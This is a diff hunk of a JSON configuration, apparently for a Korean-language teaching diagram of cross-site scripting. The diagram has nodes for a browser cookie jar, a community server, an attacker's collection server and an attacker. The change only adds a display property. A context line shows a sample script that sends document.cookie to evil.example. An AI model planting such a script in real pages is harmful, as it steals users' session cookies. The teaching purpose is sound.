@@ -22,7 +22,7 @@
         "back": { "title": "숨은 스크립트", "lines": ["<script>", "fetch('//evil.example/c?'", "  + document.cookie)", "</script>"] }
       },
       { "id": "jar", "name": "쿠키 보관함", "role": "user", "kind": "cookieJar", "parent": "browser" },
-      { "id": "board", "name": "커뮤니티 서버", "role": "server", "kind": "server", "zone": "server", "site": "board.example" },
+      { "id": "board", "name": "커뮤니티 서버", "role": "server", "kind": "server", "look": "community", "zone": "server", "site": "board.example" },
       { "id": "evil", "name": "공격자 수집 서버", "role": "server", "kind": "server", "zone": "server", "site": "evil.example", "tone": "attack" },
       { "id": "attacker", "name": "공격자", "role": "attacker", "kind": "attacker", "zone": "outside" }
     ],
